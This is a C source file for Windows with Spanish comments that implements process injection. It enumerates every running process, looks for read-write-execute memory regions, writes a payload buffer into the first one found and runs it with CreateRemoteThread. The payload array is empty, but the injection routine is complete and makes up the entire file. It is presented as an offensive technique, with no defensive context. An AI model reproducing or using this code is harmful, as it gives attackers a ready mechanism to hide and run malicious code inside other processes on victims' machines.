#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char my_payload[] = "";

int main(int argc, char* argv[])
{
	// Estructura para almacenar información sobre una región de memoria
	MEMORY_BASIC_INFORMATION         m;
	// Estructura para almacenar información sobre un proceso
	PROCESSENTRY32			        pe;
	// Puntero a una dirección de memoria 
	LPVOID					   address;
	// Manejador de un proceso
	HANDLE						    ph;
	// Manejador de una instantánea de proceso 
	HANDLE				     hSnapshot;
	// Almacenar el resultado de las llamadas a la API 
	BOOL					   hResult;
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Crea una instantánea de los procesos en ejecución
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
		return -1;
	
	// Obtiene la primera entrada de proceso de la instantánea 
	hResult = Process32First(hSnapshot, &pe);

	while (hResult)
	{
		// Abre el proceso actual con el máximo acceso 
		ph = OpenProcess(MAXIMUM_ALLOWED, false, pe.th32ProcessID);
		if (ph)
		{
			// Imprime el nombre del proceso que se está examinando
			printf("Hunting in %s \n", pe.szExeFile);
			// Consulta información sobre las regiones de memoria dentro del proceso
			while (VirtualQueryEx(ph, address, &m, sizeof(m)))
			{
				address = (LPVOID)((DWORD_PTR)m.BaseAddress + m.RegionSize);
				if (m.AllocationProtect == PAGE_EXECUTE_READWRITE)
				{
					printf("RWX memory  successfully found at 0x%x :) \n", m.BaseAddress);
					// Intentamos escribir en la región de memoria RWX
					WriteProcessMemory(ph, m.BaseAddress, my_payload, sizeof(my_payload), NULL);
					// Crea un nuevo hilo dentro del proceso de destino que comienza la ejecución
					// en la dirección en donde se escribíó la carga útil
					CreateRemoteThread(ph, NULL, NULL, (LPTHREAD_START_ROUTINE)m.BaseAddress, NULL, NULL, NULL);
					break;
				}
			}
			address = 0;
		}
		//  El bucle itera a través de todos los procesos en la instantánea
		hResult = Process32Next(hSnapshot, &pe);
	}

	// Limpieza
	CloseHandle(hSnapshot);
	CloseHandle(ph);

	return 0;
}



